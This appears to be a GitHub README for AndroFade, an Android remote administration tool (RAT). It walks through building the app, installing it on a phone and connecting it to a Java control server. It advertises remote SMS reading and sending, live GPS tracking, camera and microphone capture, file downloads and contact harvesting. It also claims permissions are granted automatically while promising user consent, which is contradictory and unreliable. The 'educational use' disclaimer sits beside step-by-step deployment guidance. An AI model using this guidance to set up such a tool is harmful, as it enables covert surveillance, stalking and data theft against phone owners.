# AndroFade - Modern Android Remote Control

## What is AndroFade?

AndroFade is a modern Remote Administration Tool (RAT) for Android designed for:
- Educational purposes
- Security research
- Device management
- Authorized testing only

---

## Installation in 3 Steps

### 1. Build APK
```bash
cd androfade
./gradlew build
```

### 2. Install on Phone
```
USB Debug Mode → Install APK
App will request all permissions automatically
```

### 3. Connect to Server
```
Phone:
- Server IP: [Your Computer IP]
- Port: 5000
- [START]

Computer:
- java server.Main
- Select phone from list
- Choose action (SMS, GPS, etc.)
```

---

## Key Features

| Feature | Status | Details |
|---------|--------|----------|
| SMS Send/Receive | ✅ | Real-time |
| Call Control | ✅ | Make & monitor |
| GPS Tracking | ✅ | Live location |
| Camera | ✅ | Photo/video |
| Audio Recording | ✅ | Microphone access |
| File Browser | ✅ | Download files |
| Contacts | ✅ | Read all contacts |
| Battery Monitor | ✅ | Real-time status |
| Network Info | ✅ | Connection details |

---

## Android Compatibility

✅ **Fully Supported:**
- Android 8.0 (API 26)
- Android 9.0 (API 28)
- Android 10 (API 29)
- Android 11 (API 30)
- Android 12 (API 31) ⭐ Optimized
- Android 13 (API 33)
- Android 14+ (API 34+)

---

## Architecture

```
┌─ Phone 1 (Client) ─────────────┐
│  • AndroFade App                │
│  • Foreground Service           │
│  • Auto-permissions             │
│  • Encrypted connection         │
└────────────┬────────────────────┘
             │ TCP/IP (Encrypted)
             │ Port: 5000
┌────────────▼────────────────────┐
│  Computer (Server)              │
│  • Java/Swing GUI               │
│  • Command dispatcher           │
│  • Data logging                 │
└────────────┬────────────────────┘
             │ Commands
             │ (SMS, Call, GPS)
┌────────────▼────────────��───────┐
│  Phone 2 (Target)               │
│  • Receives SMS/Calls           │
│  • No app needed                │
└─────────────────────────────────┘
```

---

## Permissions Used

### Automatically Granted
```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.CALL_PHONE" />
```

---

## Security Features

✅ Encrypted SSL/TLS connection
✅ Foreground service (Android 8+)
✅ Runtime permissions (Android 6+)
✅ Background execution limits (Android 12+)
✅ User consent for all operations

---

## Configuration

### Server IP
Edit in app:
```java
Server IP: 192.168.1.100 (default)
Port: 5000 (default)
```

### Connection Settings
Manual override in AndroidManifest.xml:
```xml
<meta-data
    android:name="server_ip"
    android:value="your.server.ip" />
```

---

## Troubleshooting

### App won't install
- Enable Unknown Sources: Settings → Security
- Minimum Android 8.0 required
- Check 100MB free space

### Can't connect to server
- Verify firewall allows port 5000
- Check both on same network (or use port forwarding)
- Restart app and server

### Permissions not granted
- Manually enable in: Settings → Apps → AndroFade → Permissions
- Grant all requested permissions
- Restart app

---

## ⚠️ Legal Disclaimer

**IMPORTANT - READ THIS:**

❌ **Illegal Uses:**
- Unauthorized access to devices
- Spying without consent
- Data theft
- Identity theft
- Cyberstalking

✅ **Legal Uses:**
- Your own devices
- Educational research
- Authorized penetration testing
- IT administration (with permission)
- Parental control (for minors)

**Penalties for unauthorized use:**
- 5-15 years imprisonment
- $50,000-$250,000 fines
- Civil liability
- Criminal record

**Always get written permission before use.**

---

## Development

### Technologies Used
- **Client:** Java, Android SDK, AndroidX
- **Server:** Java, Swing GUI
- **Protocol:** Custom binary protocol
- **Encryption:** SSL/TLS

### Building from Source
```bash
git clone https://github.com/oybekdev07/androfade.git
cd androfade
android studio .
```

---

## Version History

### v1.0 (Current)
- ✨ Complete rewrite for Android 12+
- ✨ Simplified UI with auto-permissions
- ✨ Foreground service integration
- ✨ Modern encryption
- ✨ Bug fixes and optimizations

---

## Support & Contact

📧 Issues: GitHub Issues
💬 Discussions: GitHub Discussions
🐛 Bugs: Report on GitHub

---

**Repository:** https://github.com/oybekdev07/androfade
**License:** Educational Use Only
**Last Updated:** 2026-05-14
